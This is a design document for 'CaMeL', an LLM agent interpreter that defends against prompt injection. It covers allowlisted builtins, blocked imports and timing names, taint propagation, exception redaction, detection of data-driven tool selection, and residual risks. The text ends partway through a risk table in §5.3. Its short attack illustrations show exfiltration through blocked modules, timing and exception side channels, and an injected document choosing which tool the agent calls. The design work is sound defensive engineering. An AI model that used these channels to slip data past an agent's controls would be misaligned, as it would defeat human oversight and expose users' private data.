# CaMeL Security Hardening Design Document

**Version:** 1.0 (Milestone 4 — Final)
**Date:** 2026-03-17
**Author:** Software Architect
**Status:** Published — all Milestone 4 hardening phases delivered and verified

_This is the canonical standalone reference for all Milestone 4 security hardening decisions.
For component-specific deep dives, see the linked per-feature design documents._

_Related documents:_
- _`docs/milestone4_design.md` — Milestone 4 feature register and sprint outcomes_
- _`docs/security_hardening_allowlist.md` — expanded allowlist design with full YAML audit trail_
- _`docs/design/milestone4-strict-mode-extension.md` — STRICT mode implementation details_
- _`docs/design/milestone4-exception-hardening.md` — exception hardening implementation details_
- _`docs/design/milestone4-escalation-detection.md` — escalation detection implementation details_
- _`docs/releases/milestone4_release_notes.md` — Milestone 4 release notes_
- _`camel/config/allowlist.yaml` — central allowlist configuration file_
- _PRD §6.3, §7.3, NFR-1_

---

## Table of Contents

1. [Allowlist Rationale & Audit Trail](#1-allowlist-rationale--audit-trail)
   - 1.1 [Threat: Unrestricted Interpreter Namespace](#11-threat-unrestricted-interpreter-namespace)
   - 1.2 [Permitted Builtin Set (M4-F11)](#12-permitted-builtin-set-m4-f11)
   - 1.3 [Timing Primitive Exclusion (M4-F12)](#13-timing-primitive-exclusion-m4-f12)
   - 1.4 [Import Statement Interception (M4-F10)](#14-import-statement-interception-m4-f10)
   - 1.5 [ForbiddenNameError (M4-F14)](#15-forbiddennameerror-m4-f14)
   - 1.6 [Central Configuration & Review Gate (M4-F13)](#16-central-configuration--review-gate-m4-f13)
   - 1.7 [Rejected Builtins — Exclusion Decisions](#17-rejected-builtins--exclusion-decisions)
2. [STRICT Mode Design Decisions](#2-strict-mode-design-decisions)
   - 2.1 [Security Motivation](#21-security-motivation)
   - 2.2 [For-Loop Iterable Propagation (M4-F1)](#22-for-loop-iterable-propagation-m4-f1)
   - 2.3 [If/Else Condition Propagation (M4-F2)](#23-ifelse-condition-propagation-m4-f2)
   - 2.4 [Post-Q-LLM Remainder Propagation (M4-F3/F4)](#24-post-q-llm-remainder-propagation-m4-f3f4)
   - 2.5 [STRICT Mode as Default (M4-F5)](#25-strict-mode-as-default-m4-f5)
   - 2.6 [Side-Channel Vectors Closed](#26-side-channel-vectors-closed)
3. [Exception Redaction Design](#3-exception-redaction-design)
   - 3.1 [Threat: Exception-Based Information Leakage](#31-threat-exception-based-information-leakage)
   - 3.2 [Dependency-Graph-Aware Redaction (M4-F6)](#32-dependency-graph-aware-redaction-m4-f6)
   - 3.3 [NotEnoughInformationError Handler (M4-F7)](#33-notentoughinformationerror-handler-m4-f7)
   - 3.4 [Annotation Preservation Across Retries (M4-F8)](#34-annotation-preservation-across-retries-m4-f8)
   - 3.5 [Loop-Body Exception Propagation (M4-F9)](#35-loop-body-exception-propagation-m4-f9)
   - 3.6 [Redaction Audit Events (M4-F17)](#36-redaction-audit-events-m4-f17)
   - 3.7 [What Redaction Does Not Guarantee](#37-what-redaction-does-not-guarantee)
4. [Escalation Detection Design](#4-escalation-detection-design)
   - 4.1 [Threat: Data-to-Control-Flow Escalation](#41-threat-data-to-control-flow-escalation)
   - 4.2 [DataToControlFlowWarning Detector (M4-F15)](#42-datatocontrolflowwarning-detector-m4-f15)
   - 4.3 [Elevated User Consent Gate (M4-F16)](#43-elevated-user-consent-gate-m4-f16)
   - 4.4 [STRICT Mode Dependency Audit Log (M4-F18)](#44-strict-mode-dependency-audit-log-m4-f18)
   - 4.5 [What Escalation Detection Does Not Guarantee](#45-what-escalation-detection-does-not-guarantee)
5. [Residual Risk Register](#5-residual-risk-register)
   - 5.1 [L3 — Exception Side Channel (Residual)](#51-l3--exception-side-channel-residual)
   - 5.2 [L4 — User Fatigue from Policy Denials](#52-l4--user-fatigue-from-policy-denials)
   - 5.3 [NG4 — Partial Timing Mitigation](#53-ng4--partial-timing-mitigation)
   - 5.4 [L6 — ROP-Analogue Action Chaining](#54-l6--rop-analogue-action-chaining)

---

## 1. Allowlist Rationale & Audit Trail

### 1.1 Threat: Unrestricted Interpreter Namespace

The CaMeL interpreter executes P-LLM-generated Python code.  Without namespace
restrictions, a malicious or erroneous P-LLM plan could:

- Import the `time` module and use `sleep()` to encode private data in observable
  call timing.
- Import arbitrary standard-library modules (`os`, `subprocess`, `socket`) to
  exfiltrate data or alter system state outside the tool API.
- Access `__builtins__` or reflection primitives (`getattr`, `globals`, `vars`,
  `eval`, `exec`, `compile`) to escape the interpreter's capability-tracking layer.

The allowlist enforcement closes these vectors at the interpreter layer, before any
policy evaluation runs.

### 1.2 Permitted Builtin Set (M4-F11)

The interpreter exposes exactly the following names in its built-in namespace.
All other names are rejected with `ForbiddenNameError` (M4-F14).

| Name | Risk Level | Justification |
|---|---|---|
| `len` | Low | Sequence length; no I/O, no mutation, no timing |
| `range` | Low | Integer range iteration; no I/O, no mutation |
| `list` | Low | List constructor; pure data structure |
| `dict` | Low | Dict constructor; pure data structure |
| `str` | Low | String constructor/conversion; no I/O |
| `int` | Low | Integer constructor/conversion; no I/O |
| `float` | Low | Float constructor/conversion; no I/O |
| `bool` | Low | Boolean constructor/conversion; no I/O |
| `set` | Low | Set constructor; pure data structure |
| `isinstance` | Low | Type check only; read-only, no I/O |
| `print` | Low | Routed to display channel, not P-LLM context |
| `enumerate` | Low | Index-value pair iterator; no I/O |
| `zip` | Low | Parallel iterator; no I/O |
| `sorted` | Low | New sorted list; no mutation of input |
| `min` | Low | Minimum value; no I/O |
| `max` | Low | Maximum value; no I/O |

This is a whitelist-by-default posture: every builtin not explicitly approved is
excluded, regardless of its typical safety profile.  The 16 approved names cover
all data-manipulation patterns needed for well-formed P-LLM execution plans.

**Runtime enforcement:** `_eval_Name` in the interpreter resolves names in this order:
1. User-defined variables in `_store`.
2. Permitted builtins in `_permitted_namespace`.
3. All other names → `ForbiddenNameError`.

### 1.3 Timing Primitive Exclusion (M4-F12)

All timing-related names are unconditionally excluded from the interpreter namespace.
The following categories are excluded:

| Category | Excluded names |
|---|---|
| `time` module functions | `time`, `sleep`, `perf_counter`, `perf_counter_ns`, `monotonic`, `monotonic_ns`, `process_time`, `process_time_ns`, `clock`, `gmtime`, `localtime`, `mktime`, `strftime`, `strptime`, `asctime`, `ctime` |
| `datetime` classes | `datetime`, `date`, `timedelta`, `timezone` |
| `timeit` utilities | `timeit` |

**Security rationale:** Timing primitives allow P-LLM-generated code to observe
elapsed time, encode data in call delays (`sleep(secret_value * 0.001)`), or
construct covert channels via OS-observable timing variation.  Excluding all timing
names eliminates the direct timing channel.  The `time` module cannot be accessed
even via `import time` (blocked by M4-F10) or bare name access (blocked by M4-F14).

Note: The exclusion covers the primary timing attack surface.  Tool-implementation
timing variation (the latency of external calls as observable by a side channel)
is outside the interpreter's control and documented as residual risk (NG4/R3 in §5.3).

### 1.4 Import Statement Interception (M4-F10)

Any `import` or `from … import` statement in P-LLM-generated code raises
`ForbiddenImportError` **before any statement in the code block executes**.  The
check is performed as a pre-scan of the parsed AST:

```
_pre_scan_imports(tree: ast.Module) -> None:
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            self._emit_allowlist_audit_event(
                event_type="ForbiddenImportAccess",
                offending_name=node.names[0].name,
                line_number=node.lineno,
            )
            raise ForbiddenImportError(node.names[0].name, node.lineno)
```

**Key properties:**
- The pre-scan fires before any statement is executed — no side effects occur.
- Dead-code imports (`if False: import time`) are still blocked.
- `ForbiddenImportError` includes `module_name` and `lineno` attributes.
- The event is written to the security audit log (NFR-6).

**Why pre-scan rather than runtime check:** A runtime check at the `ast.Import`
node evaluation would allow preceding statements to execute, potentially producing
observable side effects before the import is blocked.  The pre-scan provides a
stronger guarantee: the code block is atomically rejected if any import is present.

### 1.5 ForbiddenNameError (M4-F14)

When `_eval_Name` encounters a name that is neither a user-defined variable nor a
permitted builtin, it raises `ForbiddenNameError`:

```python
class ForbiddenNameError(Exception):
    def __init__(self, name: str, lineno: int | None = None) -> None:
        self.offending_name = name
        self.lineno = lineno
        super().__init__(f"Name '{name}' is not permitted (line {lineno})")
```

**Attributes:**
- `offending_name: str` — the disallowed name attempted.
- `lineno: int | None` — AST source line; enables targeted P-LLM retry.
- `str(ForbiddenNameError)` always contains the offending name.

The `ExceptionRedactor` classifies `ForbiddenNameError` as `trust_level="trusted"`
because the message contains only P-LLM-generated code identifiers — no untrusted
runtime values.  The full message is forwarded to the P-LLM retry prompt.

### 1.6 Central Configuration & Review Gate (M4-F13)

The permitted builtin set and excluded timing names are defined in a single
auditable configuration file:

```
camel/config/allowlist.yaml
```

**Schema:**

```yaml
review_gate:
  last_reviewed: "2026-03-17"
  reviewers: ["security-team"]
  review_required: true

permitted_builtins:
  - name: len
    risk_level: low
    justification: "Sequence length; no I/O, no mutation, no timing"
  # … (all 16 entries)

excluded_timing_names:
  - name: time
    category: stdlib_module
    rationale: "Primary timing module; all subattributes excluded"
  # … (all timing entries)
```

**Security review gate:** Any modification to `allowlist.yaml` (addition, removal,
or annotation change) **must** go through this process before merging:

1. Open a pull request with a security rationale for the change.
2. A named reviewer from `review_gate.reviewers` provides an explicit sign-off.
3. The rationale is added inline as a YAML comment on the affected entry.
4. `review_gate.last_reviewed` is updated to the review date.
5. New entries carry a `risk_level` (low / medium / high) and a `justification`.

There is **no** runtime override flag that widens the permitted namespace.  Any
workflow requiring a name not in the allowlist must register it as a CaMeL tool
with full capability and policy tracking.

**Loader:** `camel/config/loader.py` — `AllowlistLoader` class parses `allowlist.yaml`,
validates it against a Pydantic model (`AllowlistConfig`), and caches the result at
module import time.  `AllowlistConfigurationError` is raised on any structural violation,
preventing the interpreter from starting in a misconfigured state.

### 1.7 Rejected Builtins — Exclusion Decisions

The following builtins were explicitly evaluated and rejected:

| Name | Rejection Reason |
|---|---|
| `eval`, `exec`, `compile` | Arbitrary code execution; capability tracking bypass |
| `open`, `input` | I/O primitives bypassing the tool API |
| `getattr`, `setattr`, `delattr` | Reflection; can modify internal objects |
| `globals`, `locals`, `vars`, `dir` | Namespace introspection; can expose internal state |
| `__import__` | Module loading bypass for M4-F10 |
| `type`, `object`, `super` | OOP primitives; not needed in restricted execution plans |
| `property`, `classmethod`, `staticmethod` | Class-level features; not applicable in P-LLM plans |
| `callable`, `repr`, `hash` | Not needed; `isinstance` covers type checks |
| `map`, `filter` | Duplicated by `for` loops; removing avoids lazy evaluation semantics |
| `sum`, `abs`, `round`, `divmod`, `pow` | Not in current plan vocabulary; can be added with review |
| `any`, `all`, `next`, `iter` | Not in current plan vocabulary; can be added with review |
| `bytes`, `bytearray`, `memoryview` | Binary I/O; not needed; binary data leakage risk |
| `format`, `chr`, `ord`, `bin`, `hex`, `oct` | Not needed; string encoding risk |
| `hasattr` | Reflection; partial coverage of `getattr` risk |
| `id` | Memory address exposure; not needed |
| `breakpoint` | Debugger injection; always excluded |
| `exit`, `quit` | Process control; always excluded |

---

## 2. STRICT Mode Design Decisions

### 2.1 Security Motivation

CaMeL's NORMAL mode dependency tracking records which variables directly influenced
a given value through data assignments.  This is sufficient for data-flow policy
enforcement (G2, G3) when data flows explicitly through assignments.

However, three classes of control-flow construct allow untrusted data to *implicitly*
influence downstream values without appearing in a direct assignment chain:

1. **For-loop iterables:** The loop body executes once per iterable element.  An
   adversary who controls the iterable can infer how many elements it contains by
   observing how many tool calls the loop produces.  In NORMAL mode, variables
   assigned inside the loop do not carry the iterable's provenance as a dependency
   unless they are directly derived from the iterable element.

2. **If/else conditions:** When a branch is taken based on untrusted data, all values
   assigned inside either branch are implicitly tainted by the condition.  An observer
   who sees which downstream tools fire can infer the condition's value — a
   control-flow side channel.  In NORMAL mode, branch-assigned variables do not carry
   the condition's provenance.

3. **Post-Q-LLM assignments:** The Q-LLM processes untrusted data and returns
   structured results.  Assignments in the same code block that follow a Q-LLM call
   may be transitively influenced by Q-LLM output even when they do not directly
   reference the Q-LLM result variable.  In NORMAL mode, these indirect downstream
   assignments are not tainted.

STRICT mode closes all three gaps with explicit dependency propagation rules.

### 2.2 For-Loop Iterable Propagation (M4-F1)

**Rule:** In STRICT mode, the capability set and dependency set of the `for`-loop
iterable expression are merged into every assignment that occurs inside the loop body
(including nested blocks).

**Mechanism:** `_exec_For` evaluates the iterable, captures its capability context
(`iter_cv`), then passes `inner_ctx_caps = _merge_ctx_caps(iter_cv, ctx_caps)` to
every statement in the loop body.  The `_dep_ctx_stack` is updated with the iterable's
dependency set so `_store_value` merges these into each stored assignment.

**Side-channel closed:** The loop-count inference channel.  With M4-F1 active, any
variable produced inside a loop body carries the iterable's untrusted provenance.
The policy engine detects this provenance before any downstream tool call, preventing
the loop from functioning as a covert data channel.

**Negative invariant:** Loops over trusted literals (`range(5)`, `["a", "b", "c"]`)
do NOT introduce untrusted taint.  M4-F1 only propagates dependencies that actually
exist on the iterable — there is no over-tainting of unconditionally trusted iterables.

### 2.3 If/Else Condition Propagation (M4-F2)

**Rule:** In STRICT mode, the capability set and dependency set of the `if/else`
condition expression are merged into every assignment in both the true branch and the
false branch.

**Mechanism:** `_exec_If` evaluates the test expression, captures `test_cv`, and
passes `inner_ctx_caps = _merge_ctx_caps(test_cv, ctx_caps)` to both the `body` and
`orelse` statement lists.  Both branches receive the same context augmentation
regardless of which branch is taken.

**Side-channel closed:** The branch-observation channel.  An adversary who can observe
which tool calls fire in the true vs. false branch can infer the condition's value.
M4-F2 ensures all values assigned in either branch carry the condition's untrusted
provenance, so any downstream tool call involving those values requires policy approval
before proceeding.

### 2.4 Post-Q-LLM Remainder Propagation (M4-F3/F4)

**Rule (M4-F3):** After a `query_quarantined_llm()` call in a code block, all
subsequent assignments in the same block inherit the Q-LLM result's capabilities as
additional context dependencies.

**Rule (M4-F4):** The remainder flag is scoped to the current `_exec_statements`
frame and resets on block exit.  It does not retroactively affect prior statements.

**Mechanism:** `_exec_statements` sets a `_last_qllm_result_cv` flag when a
`query_quarantined_llm()` call is encountered.  Subsequent `_store_value` calls within
the same block merge `_last_qllm_result_cv.sources` into the stored value's dependency
set.  On block exit, `_last_qllm_result_cv` is reset to `None`.

**Side-channel closed:** The Q-LLM data-to-assignment channel.  Assignments that do
not directly reference the Q-LLM result variable may still be transitively influenced
by its output.  M4-F3/F4 surfaces Q-LLM-derived provenance to the policy engine for
all block-local assignments after the Q-LLM call.

### 2.5 STRICT Mode as Default (M4-F5)

As of CaMeL v0.4.0, `ExecutionMode.STRICT` is the `CaMeLInterpreter` constructor
default.  NORMAL mode requires explicit opt-in:

```python
# Secure default — STRICT mode active:
interpreter = CaMeLInterpreter(tools=..., policies=...)

# NORMAL mode — explicit opt-in required; not for production:
interpreter = CaMeLInterpreter(tools=..., policies=..., mode=ExecutionMode.NORMAL)
```

**Rationale:** Security defaults reduce the probability of mis-configuration.  A new
deployment that does not specify a mode receives STRICT mode automatically, with no
additional configuration required.  NORMAL mode is retained only for debugging and
non-security-sensitive scenarios.

### 2.6 Side-Channel Vectors Closed

| Attack Vector | Closed By | Status |
|---|---|---|
| Loop-count inference via untrusted iterable | M4-F1 | ✅ Closed |
| Branch-observation via untrusted condition | M4-F2 | ✅ Closed |
| Q-LLM data-to-assignment implicit taint | M4-F3/F4 | ✅ Closed |
| Timing side channel via `time` module | M4-F10, M4-F12 | ✅ Closed (primary vector) |
| Exception message leakage to P-LLM | M4-F6, M4-F7 | ✅ Closed |
| Loop-body exception taint drop on retry | M4-F9 | ✅ Closed |

---

## 3. Exception Redaction Design

### 3.1 Threat: Exception-Based Information Leakage

When an exception occurs during interpreter execution, its message may contain a
fragment of the value that caused the error.  Example:

```python
# P-LLM-generated plan
email = get_last_email()                     # untrusted return value
n = int(email["subject"])                    # email subject is adversary-controlled
```

If the subject contains `"secret_token_XYZ"`, Python raises:
```
ValueError: invalid literal for int() with base 10: 'secret_token_XYZ'
```

Without redaction, the retry prompt forwarded to the P-LLM would include the verbatim
error message — carrying adversary-controlled content across the trusted/untrusted
boundary.

Exception hardening closes this channel by applying dependency-graph-aware taint
classification to every exception before it reaches the retry prompt builder.

### 3.2 Dependency-Graph-Aware Redaction (M4-F6)

**Algorithm:** For each exception caught by the orchestrator, `ExceptionRedactor.classify()`
walks the interpreter's variable store and dependency graph:

```
_is_tainted(exc, store, interpreter) → (bool, dep_chain):

  TRUSTED_SOURCES = {"User literal", "CaMeL"}

  for var in store.keys():
    cv = store[var]
    for src in cv.sources:
      if src not in TRUSTED_SOURCES:
        dep_chain.append((var, src))      # direct untrusted source

    dg = interpreter.get_dependency_graph(var)
    for upstream_var in dg.all_upstream:
      for src in store[upstream_var].sources:
        if src not in TRUSTED_SOURCES:
          dep_chain.append((upstream_var, src))  # upstream untrusted source

  return (bool(dep_chain), dep_chain[:50])
```

**Redaction decision:**
- If tainted: `RedactedError(message=None, trust_level="untrusted")`.
- If not tainted: `RedactedError(message=str(exc), trust_level="trusted")`.

**Design rationale for graph-aware (not flat) check:** A flat check — redacting
whenever any untrusted value is in scope — over-redacts trusted exceptions (e.g., a
`NameError` caused by a P-LLM coding error is redacted because an unrelated untrusted
email variable exists in scope).  The graph-aware approach only redacts when the
exception-causing variable has a demonstrable upstream dependency on untrusted data.

### 3.3 NotEnoughInformationError Handler (M4-F7)

`NotEnoughInformationError` (NEIE) is raised when the Q-LLM sets
`have_enough_information = False`.  The Q-LLM's reason for insufficient information
is itself potentially adversary-controlled content.

**Handler contract:**
- `message` is always set to `None` in `RedactedError` — zero Q-LLM content forwarded.
- `trust_level = "not_enough_information"`.
- The P-LLM retry prompt receives a fixed advisory:
  > "The call to `query_quarantined_llm()` at line N reported that the provided
  > context did not contain enough information to populate the requested schema.
  > Consider restructuring the query or passing additional context variables."
- The advisory contains only a line number (from `exc.__lineno__`) and static text.

**Defence-in-depth:** `NotEnoughInformationError.__init__` takes no arguments and
sets a fixed message string (`"Q-LLM indicated insufficient information"`).  Even if
the message were accidentally forwarded, it would contain no untrusted content.
M4-F7 adds a second layer by ensuring `RedactedError.message` is always `None`.

### 3.4 Annotation Preservation Across Retries (M4-F8)

When NEIE is raised and the orchestrator triggers P-LLM re-generation, a fresh
`exec()` call begins.  Without M4-F8, the dependency graph and `_dep_ctx_stack`
accumulated before the failing Q-LLM call would be lost — enabling an adversary to
engineer a NEIE at a point where preceding code established untrusted provenance,
then exploit the blank-slate annotation state in the regenerated execution.

**Snapshot/restore protocol:**

1. **Snapshot** (on NEIE): `interpreter.snapshot_dep_state()` captures
   `dependency_graph` and `dep_ctx_stack` into `AcceptedState`.
2. **Restore** (before regenerated plan executes): `interpreter.restore_dep_state(accepted_state)`
   re-loads the snapshot.

**Security invariant:** All STRICT mode taint annotations accumulated before a NEIE
are available to the regenerated plan's dependency graph and every subsequent policy
evaluation.

M4-F8 applies only to NEIE failures.  For other exception types, no snapshot is taken
and no restore occurs.

### 3.5 Loop-Body Exception Propagation (M4-F9)

When an exception originates inside a `for`-loop body and the loop's iterable is
non-public (has untrusted sources or restricted readers), the exception implicitly
carries a dependency on that iterable.  Without M4-F9, the loop iterable's dependency
context would be silently dropped across the retry cycle — the regenerated plan would
not inherit the iterable's taint.

**Condition for M4-F9 to activate:**
1. Execution mode is `ExecutionMode.STRICT`.
2. The iterable's `CaMeLValue` is "non-public" (any non-trusted source, or
   non-`Public` readers).
3. An exception propagates out of the loop body.

**Mechanism:** `_exec_For` attaches two attributes to the exception before re-raising:

```python
exc.__loop_iter_deps__ = _loop_inner_dep_ctx    # frozenset[str]
exc.__loop_iter_caps__ = inner_ctx2              # CaMeLValue | None
```

The orchestrator reads these attributes and pre-seeds the regenerated plan's
`_dep_ctx_stack` with the loop iterable's dependency context.

**Interaction with M4-F6:** When M4-F9 applies, `ExceptionRedactor` sets
`redaction_reason = "loop_body_exception"` and `m4_f9_applied = True` in the
`RedactionAuditEvent`.  The `RedactedError` still has `message=None`.

### 3.6 Redaction Audit Events (M4-F17)

Every exception processed by `ExceptionRedactor.classify()` emits a
`RedactionAuditEvent` to the security audit log:

```python
@dataclass(frozen=True)
class RedactionAuditEvent:
    timestamp:               str                    # ISO-8601 UTC
    line_number:             int | None
    redaction_reason:        str                    # "untrusted_dependency" | "not_enough_information"
                                                    # | "loop_body_exception" | "none"
    dependency_chain:        list[tuple[str, str]]  # (var_name, source_label) pairs; max 50
    trust_level:             str                    # "trusted" | "untrusted" | "not_enough_information"
    error_type:              str                    # exception class name
    redacted_message_length: int                    # len(original message) before redaction
    m4_f9_applied:           bool                   # True if M4-F9 loop propagation applied
```

**Content policy:** `dependency_chain` contains only variable names and source labels —
no raw untrusted values.  The audit log itself cannot be used as a side channel to
exfiltrate untrusted content.

**Accessible via:** `orchestrator.redaction_audit_log` (list[RedactionAuditEvent]).

### 3.7 What Redaction Does Not Guarantee

| Residual Risk | Notes |
|---|---|
| **Exception occurrence as a binary oracle** | The P-LLM still learns *that* an exception occurred at a given line. A binary oracle (exception vs. no exception) could leak one bit per retry. This is a known residual risk (L3, §5.1). |
| **Exception type as a side channel** | `error_type` (e.g., `"TypeError"`) is always forwarded. Exception class names do not echo untrusted content but may reveal structural information. |
| **Deeply nested tool exception chains** | M4-F9 closes the primary loop-body exception channel. Exceptions propagating through multiple tool call frames before reaching the interpreter's handler may not carry expected loop metadata. Residual risk documented in L3 (§5.1). |
| **Fallback over-redaction** | When `interpreter=None`, the fallback flat store scan may redact trusted exceptions when any untrusted value is in scope. The graph-aware path (M4-F6) is always preferred. |

---

## 4. Escalation Detection Design

### 4.1 Threat: Data-to-Control-Flow Escalation

A data-to-control-flow escalation attack occurs when adversary-controlled content
from tool return values or Q-LLM outputs is used to determine *which tool* is invoked.
Unlike data-flow attacks (which inject malicious arguments into legitimate tool calls),
this class influences the control path itself.

**Attack pattern:**

```python
doc = read_document("report.pdf")           # untrusted tool output
action_name = query_quarantined_llm(        # Q-LLM extracts from untrusted doc
    doc, ActionSchema
).action                                    # action is adversary-controlled string
result = action_name(sensitive_data)        # which tool fires depends on doc
```

Without M4-F15/F16, the interpreter would attempt to dispatch whatever callable
`action_name` resolves to — bypassing the policy engine's ability to audit the
tool selection.

**Relationship to P-LLM isolation:** The P-LLM isolation guarantee (PRD §7.1) ensures
the code plan is generated from the trusted user query.  However, if P-LLM-generated
code calls a variable as a function, and that variable was populated with untrusted
data, the tool selection at execution time is still adversary-influenced even though
the plan looks legitimate at generation time.  M4-F15/F16 close this gap at the
runtime dispatch layer.

### 4.2 DataToControlFlowWarning Detector (M4-F15)

**Check point:** `_eval_Call` in the interpreter, immediately after evaluating the
`func` operand and before any dispatch.

**Detection algorithm:**

```python
func_cv = self._eval_expr(node.func, ctx_caps)

untrusted_func_sources = {
    s for s in func_cv.sources if s not in TRUSTED_SOURCES
}
untrusted_dep_sources = _collect_untrusted_dep_sources(
    func_cv, offending_var, self._dep_graph, self._store
)
all_untrusted = untrusted_func_sources | untrusted_dep_sources

if all_untrusted:
    warning = DataToControlFlowWarning(
        lineno=node.lineno,
        offending_variable=offending_var,
        untrusted_sources=frozenset(all_untrusted),
        dependency_chain=_build_dep_chain(...),
    )
    self._emit_escalation_audit_event(warning)
    self._handle_escalation(warning, node)   # → M4-F16
```

`TRUSTED_SOURCES = frozenset({"User literal", "CaMeL"})` — consistent with M4-F6
and M4-F9.

**Indirect escalation coverage:** The check walks the full dependency graph of the
`func` operand (not just its direct sources), catching cases where the callable
variable is derived from rather than directly assigned from untrusted data.

**P-LLM literal calls are not flagged:** When P-LLM generates code that calls a tool
by its literal name (`send_email(...)`), the function operand has `sources={"CaMeL"}`.
This is correct — P-LLM code text is trusted.  The detection targets only the
runtime data-plane path.

### 4.3 Elevated User Consent Gate (M4-F16)

The elevated consent gate is semantically prior to and independent of the normal
policy evaluation path.  It fires whenever M4-F15 detects an escalation, regardless
of whether the tool call would be Allowed or Denied by the policy engine.

**Enforcement mode behaviour:**

| Mode | Behaviour on detection |
|---|---|
| `EVALUATION` | Raise `DataToControlFlowEscalationError` immediately; no UI interaction |
| `PRODUCTION` | Pause execution; invoke `ElevatedConsentCallback`; proceed on approval; raise on rejection |

**Secure default:** In PRODUCTION mode without a configured `elevated_consent_callback`,
the built-in `_default_reject_elevated_consent` is used — it always returns `False`,
causing every escalation to raise `DataToControlFlowEscalationError`.  The interpreter
never silently proceeds past an escalation detection.

**No bypass via prior consent:** The `DataToControlFlowAuditEvent` records each
escalation event individually — there is no memoisation of prior elevated consents.
A prior approval for the same tool does not suppress the next escalation detection.

**Defence in depth:** When elevated consent is approved in PRODUCTION mode, normal
policy engine evaluation still runs.  Both gates must be cleared.

### 4.4 STRICT Mode Dependency Audit Log (M4-F18)

M4-F18 provides post-execution observability into the STRICT mode propagation engine.
For every assignment executed under STRICT mode where the context dependency set is
non-empty, a `StrictDependencyAdditionEvent` is emitted:

```python
@dataclass(frozen=True)
class StrictDependencyAdditionEvent:
    event_type: str                          # "StrictDependencyAddition"
    timestamp: str                           # ISO-8601 UTC
    statement_lineno: int | None
    statement_type: str                      # "Assign" | "AugAssign" | "For"
    assigned_variable: str
    added_dependencies: frozenset[str]       # deps added by STRICT context
    context_source: str                      # "for_iterable" | "if_condition"
                                             # | "post_qllm" | "combined"
```

Events are emitted only when STRICT mode genuinely adds information beyond NORMAL
mode — assignments where the STRICT context is empty produce no event.

**Performance:** Events are deduplicated per `(statement_lineno, assigned_variable)`
pair per `exec()` call to prevent O(n) log flooding in tight loops.

**Accessible via:** `interpreter.strict_dep_audit_log` and `orchestrator.strict_dep_audit_log`.

M4-F18 is an observability feature, not a security control.  It provides a basis
for post-hoc audit of policy decisions and a testing hook for STRICT mode correctness.

### 4.5 What Escalation Detection Does Not Guarantee

| Residual Risk | Notes |
|---|---|
| **ROP-analogue action chaining** | M4-F15/F16 detects a single data-derived callable. An adversary who chains individually-approved tool calls to produce a collectively malicious outcome (the ROP-analogue) is not covered. Documented as L6 (§5.4). |
| **Operator approval in PRODUCTION mode** | If an operator approves an elevated consent, the tool fires. CaMeL cannot prevent a human operator from approving a malicious escalation. The audit event records the approval. |

---

## 5. Residual Risk Register

This register documents the known residual risks carried into Milestone 5.  Each
entry specifies severity, mitigation status, and an explicit caveat describing the
remaining exposure.

### 5.1 L3 — Exception Side Channel (Residual)

| Field | Value |
|---|---|
| **Risk ID** | L3 |
| **Title** | Exception side channel — residual vectors |
| **Severity** | Low |
| **PRD reference** | PRD §10 L3 |
| **Mitigation status** | Partial — primary vectors closed; two residual vectors remain |

**What is mitigated:**
- Exception message content leakage to P-LLM: closed by M4-F6 (dependency-graph-aware
  redaction).
- Q-LLM NEIE content leakage: closed by M4-F7.
- STRICT mode taint drop on NEIE retry: closed by M4-F8.
- Loop-body exception taint drop: closed by M4-F9.
- Side-channel test suite (Class 2): 17/17 tests pass at 100% for implemented
  mitigations.

**Residual vector 1 — Binary oracle:**
The P-LLM learns that an exception occurred at a given line number.  A carefully
crafted adversary could use this as a binary oracle (exception vs. no exception at
a given line) to leak one bit of information per retry attempt.  This is not directly
addressed by exception redaction, which only strips the message content.

**Residual vector 2 — Deeply nested tool call chains:**
M4-F9 attaches loop-iterable metadata when an exception propagates out of `_exec_For`.
However, exceptions originating inside deeply nested tool call chains — where the
interpreter invokes a tool that internally calls other tools, and the exception
propagates through multiple call frames before reaching the interpreter's exception
handler — may not carry the expected loop-iterable metadata.  The primary loop-body
exception channel is closed; multi-level tool call stacks remain a documented
residual risk.

**Caveat:** The binary oracle residual is a known side-channel class documented in
the original CaMeL paper (PRD §3.2 NG4).  The deeply nested tool chain residual is
bounded by the fact that tool implementations are platform-controlled and not adversary-
controlled; adversarial exploitation requires control over tool internals, which is
outside the CaMeL threat model (PRD §7.2).

**Suggested future work:** Formal analysis of the binary oracle bound; for deeply
nested chains, M4-F9 could be extended to walk the full exception cause chain
(`exc.__cause__`, `exc.__context__`) looking for `__loop_iter_deps__` attributes.

---

### 5.2 L4 — User Fatigue from Policy Denials

| Field | Value |
|---|---|
| **Risk ID** | L4 |
| **Title** | User fatigue from policy denials |
| **Severity** | Medium |
| **PRD reference** | PRD §10 L4 |
| **Mitigation status** | Documented design constraint; not addressed in Milestone 4 |

**Description:**
Overly strict security policies may generate frequent consent prompts, leading users
to approve requests without careful review — undermining the security value of the
consent mechanism.

**What Milestone 4 delivers:**
M4-F16 introduced elevated consent (a second, distinct consent class for escalation
events), making the escalation consent prompt visually and semantically distinguishable
from routine policy-denial consent.  This reduces conflation of routine and high-risk
consents.

**Residual exposure:**
The frequency of policy-denial consent prompts on benign tasks depends on policy
granularity and the quality of tool capability annotations.  Poorly annotated tools
in a deployment will produce more false-positive denials.  The reference policy
library (Milestone 3) was designed to minimise false positives on well-annotated tools,
but third-party tools without CaMeL capability annotations may trigger frequent denials.

**Caveat:** Policy tuning is a deployment-time responsibility.  CaMeL provides policy
configuration tools (PolicyRegistry, reference policies, AgentDojo mapping tests) to
assist deployments in minimising false-positive denial rates.  The PRD §11 target is
≤20% of benign tasks requiring a consent prompt on well-annotated domains.

**Suggested future work:** Policy annotation tooling (wizard-style capability annotation
wizard); automatic policy relaxation based on observed benign task patterns; aggregate
consent ("approve all same-tool-same-recipient requests for this session").

---

### 5.3 NG4 — Partial Timing Mitigation

| Field | Value |
|---|---|
| **Risk ID** | NG4 |
| **Title** | Partial timing side-channel mitigation |
| **Severity** | Low (explicitly a Non-Goal in PRD §3.2) |
| **PRD reference** | PRD §3.2 NG4; §7.3 |
| **Mitigation status** | Primary timing vector closed; residual environmental channels outside scope |

**What is mitigated:**
The interpreter excludes the `time` module and all timing primitives (M4-F10,
M4-F12).  P-LLM-generated code cannot:
- Import `time`, `datetime`, or `timeit`.
- Access `sleep()`, `perf_counter()`, `monotonic()`, or any registered timing function
  by bare name.
- Encode private data in deliberate sleep delays.

The timing primitive exclusion test suite (Class 3) passes at 100%: 62/62 tests.

**Residual timing vectors:**

| Residual Channel | Severity | Notes |
|---|---|---|
